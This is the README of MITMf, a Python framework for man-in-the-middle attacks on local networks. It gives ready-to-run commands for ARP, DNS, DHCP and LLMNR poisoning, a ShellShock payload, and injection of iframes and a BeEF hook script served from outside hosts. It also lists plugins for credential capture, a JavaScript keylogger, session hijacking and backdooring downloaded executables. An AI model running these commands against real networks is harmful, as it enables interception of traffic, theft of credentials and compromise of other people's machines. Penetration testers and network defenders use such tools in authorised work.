![Supported Python versions](https://img.shields.io/badge/python-2.7-blue.svg)
![Latest Version](https://img.shields.io/badge/mitmf-0.9.8%20--%20The%20Dark%20Side-red.svg)
![Supported OS](https://img.shields.io/badge/Supported%20OS-Linux-yellow.svg)
[![Code Climate](https://codeclimate.com/github/byt3bl33d3r/MITMf/badges/gpa.svg)](https://codeclimate.com/github/byt3bl33d3r/MITMf)

#MITMf

Framework for Man-In-The-Middle attacks

Quick tutorials, examples and developer updates at: https://byt3bl33d3r.github.io

This tool is based on [sergio-proxy](https://github.com/supernothing/sergio-proxy) and is an attempt to revive and update the project.

Contact me at:
- Twitter: @byt3bl33d3r
- IRC on Freenode: #MITMf
- Email: byt3bl33d3r@gmail.com

**Before submitting issues, please read the [FAQ](#faq) and [CONTRIBUTING.md](CONTRIBUTING.md).**

Description
============
MITMf aims to provide a one-stop-shop for Man-In-The-Middle and network attacks while updating and improving
existing attacks and techniques.

Originally built to address the significant shortcomings of other tools (e.g Ettercap, Mallory), it's been almost completely 
re-written from scratch to provide a modular and easily extendible framework that anyone can use to implement their own MITM attack.

Features
========

- The framework contains a built-in SMB, HTTP and DNS server that can be controlled and used by the various plugins it also contains a modified version of the SSLStrip proxy that allows for HTTP modification and a partial HSTS bypass.

- As of version 0.9.8, MITMf supports active packet filtering and manipulation (basically what etterfilters did, only better),
allowing users to modify any type of traffic or protocol.

- The configuration file can be edited on-the-fly while MITMf is running, the changes will be passed down through the framework: this allows you to tweak settings of plugins and servers while performing an attack.

- MITMf will capture FTP, IRC, POP, IMAP, Telnet, SMTP, SNMP (community strings), NTLMv1/v2 (all supported protocols like HTTP, SMB, LDAP etc.) and Kerberos credentials by using [Net-Creds](https://github.com/DanMcInerney/net-creds), which is run on startup.

- [Responder](https://github.com/SpiderLabs/Responder) integration allows for LLMNR, NBT-NS and MDNS poisoning and WPAD rogue server support.

Examples
========

The most basic usage, just starts the HTTP proxy SMB,DNS,HTTP servers and Net-Creds on interface enp3s0:

```python mitmf.py -i enp3s0```

ARP poison 192.168.1.0/24 with the gateway at 192.168.1.1 using the **Spoof** plugin:

```python mitmf.py -i enp3s0 --spoof --arp --target 192.168.1.0/24 --gateway 192.168.1.1```

Same as above + a WPAD rougue proxy server using the **Responder** plugin:

```python mitmf.py -i enp3s0 --spoof --arp --target 192.168.0.0/24 --gateway 192.168.1.1 --responder --wpad```

Enable DNS spoofing while ARP poisoning (Domains to spoof are pulled from the config file):

```python mitmf.py -i enp3s0 --spoof --dns --arp --target 192.168.1.0/24 --gateway 192.168.1.1```

Enable LLMNR/NBTNS/MDNS spoofing:

```python mitmf.py -i enp3s0 --responder --wredir --nbtns```

Enable DHCP spoofing (the ip pool and subnet are pulled from the config file):

```python mitmf.py -i enp3s0 --spoof --dhcp```

Same as above with a ShellShock payload that will be executed if any client is vulnerable:

```python mitmf.py -i enp3s0 --spoof --dhcp --shellshock 'echo 0wn3d'```

Inject an HTML IFrame using the **Inject** plugin:

```python mitmf.py -i enp3s0 --inject --html-url http://some-evil-website.com```

Inject a JS script:

```python mitmf.py -i enp3s0 --inject --js-url http://beef:3000/hook.js```

And much much more! Of course you can mix and match almost any plugin together (e.g. ARP spoof + inject + Responder etc..) 

#Currently available plugins

- **HTA Drive-By**     : Injects a fake update notification and prompts clients to download an HTA application
- **SMBTrap**          : Exploits the 'SMB Trap' vulnerability on connected clients
- **ScreenShotter**    : Uses HTML5 Canvas to render an accurate screenshot of a clients browser
- **Responder**        : LLMNR, NBT-NS, WPAD and MDNS poisoner
- **SSLstrip+**        : Partially bypass HSTS
- **Spoof**            : Redirect traffic using ARP, ICMP, DHCP or DNS spoofing
- **BeEFAutorun**      : Autoruns BeEF modules based on a client's OS or browser type
- **AppCachePoison**   : Performs HTML5 App-Cache poisoning attacks 
- **Ferret-NG**        : Transperently hijacks client sessions
- **BrowserProfiler**  : Attempts to enumerate all browser plugins of connected clients
- **FilePwn**          : Backdoor executables sent over HTTP using the Backdoor Factory and BDFProxy
- **Inject**           : Inject arbitrary content into HTML content
- **BrowserSniper**    : Performs drive-by attacks on clients with out-of-date browser plugins
- **JSkeylogger**      : Injects a Javascript keylogger into a client's webpages
- **Replace**          : Replace arbitary content in HTML content
- **SMBAuth**          : Evoke SMB challenge-response authentication attempts
- **Upsidedownternet** : Flips images 180 degrees

How to install on Kali
======================

```apt-get install mitmf```

**Currently Kali has a very old version of MITMf in its repos, read the [Installation](#installation) section to get the latest version**

Installation
============

- Clone this repository
- Run the ```setup.sh``` script
- Run the command ```pip install --upgrade -r requirements.txt``` to install all Python dependencies

**Note:** on Kali, Debian (and possibly Ubuntu): If pip complains about ```pcap.h``` missing, install the ```libpcap0.8-dev``` and ```python-pypcap``` packages and try again

**Note 2:** If ```netfilterqueue``` fails to compile, install the ```libnetfilter-queue-dev``` package

FAQ
===
- **Is Windows supported?**
- Nope, don't think it will ever be

- **Is OSX supported?**
- Initial compatibility has been introduced in 0.9.8, still needs some testing, find anything broken submit a PR or open an issue ticket!

- **I can't install package X because of an error!**
- Try installing the package via ```pip``` or your distro's package manager. This *isn't* a problem with MITMf.

- **How do I install package X?**
- Please read the [installation](#installation) guide.

- **I get an ImportError when launching MITMf!**
- Please read the [installation](#installation) guide.

- **Dude, no documentation?**
- The docs are a work in progress at the moment, once the framework hits 1.0 I will push them to the wiki
